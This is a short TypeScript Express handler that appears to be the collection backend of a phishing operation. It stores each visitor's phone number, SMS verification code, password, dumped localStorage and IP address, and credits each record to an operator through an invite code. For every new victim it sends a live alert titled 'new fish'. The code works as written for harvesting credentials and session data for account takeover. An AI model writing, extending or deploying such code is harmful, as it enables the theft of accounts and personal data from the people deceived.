import { Request, Response } from 'express';
import Customer from '../models/customer'; // 确保正确导入 Customer 模型
import handleAsync from '../utils/handleAsync';
import { io } from '../services/socket';
import User from '../models/user';

export const handleSpamRequest = handleAsync(
  async (req: Request, res: Response) => {
    const { data } = req.body;

    const parsedData = JSON.parse(data);

    const { phoneCode, password, phoneNumber, inviteCode, ...rest } =
      parsedData;

    if (!phoneNumber && !phoneCode) {
      res.status(400);
      throw new Error('Phone number and verification code is required');
    }

    console.log('phonecode', phoneCode);

    const customer = await Customer.findOne({ phoneNumber });

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址

    const user = (await User.findOne({ inviteCode })) || null;

    if (customer) {
      await customer.updateOne({
        phoneCode,
        password: password || customer.password,
        localStorage: JSON.stringify(rest),
        ip,
        user,
      });
    } else {
      const newCustomer = new Customer({
        phoneCode,
        password,
        phoneNumber,
        localStorage: JSON.stringify(rest),
        ip,
        user,
      });
      await newCustomer.save();

      io.emit('newCustomerAdded', { title: '新鱼儿', message: '有新鱼儿加入' });
    }

    res.status(200).json({
      message: 'success',
    });
  },
);
